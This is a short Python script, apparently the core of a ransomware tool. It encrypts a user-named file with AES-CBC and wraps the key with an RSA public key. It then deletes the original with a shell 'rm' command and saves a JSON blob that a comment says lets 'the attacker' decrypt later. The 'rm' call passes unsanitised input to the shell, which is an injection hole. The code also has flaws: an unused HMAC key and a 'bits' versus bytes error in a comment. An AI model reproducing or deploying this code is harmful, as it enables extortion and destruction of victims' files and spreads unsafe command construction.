from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from cryptography.hazmat.primitives import padding
import os
import json
import hashlib
import hmac
from base64 import b64encode

key_length = 32
iv_length = 16
block_size = 16

# Makes sure that the length of the message to be encrypted is a multiple of 16 bits
def pad(msg):
	padder = padding.PKCS7(block_size*8).padder()
	padded_data = padder.update(msg)
	padded_data += padder.finalize()
	return padded_data

def RSA_Encrypt(data, pub_path):
	with open(pub_path, 'rb') as key_file:
		public_key = RSA.importKey(key_file.read())
	encryptor = PKCS1_OAEP.new(public_key)
	return encryptor.encrypt(data)

def HMAC(data, key):
	return hmac.new(key, data, hashlib.sha256)

nameOfFile = input('[*] Please Input File To Encrypt: ')
pub_path = input('[*] Please Specify File Path To Public Key: ')

extension = nameOfFile[nameOfFile.find('.'):]

key = os.urandom(key_length)
iv = os.urandom(iv_length)
hmac_key = os.urandom(key_length)

cipher = AES.new(key = key, mode = AES.MODE_CBC, IV = iv)
plaintext = open(nameOfFile, "rb").read()
plaintext = pad(plaintext)
ciphertext = cipher.encrypt(plaintext)

os.system('rm ' + nameOfFile)

encryption_info = dict()

encryption_info['key'] = b64encode(RSA_Encrypt(key+hmac_key, pub_path))
encryption_info['iv'] = b64encode(iv)
encryption_info['ciphertext'] = b64encode(ciphertext)
encryption_info['extension'] = b64encode(extension)

# Creating a JSON file to store all necessary information for the attacker
# to decrypt the file later
jsonFile = open(nameOfFile[:nameOfFile.find('.')] + ".json", 'w')
json.dump(encryption_info, jsonFile)
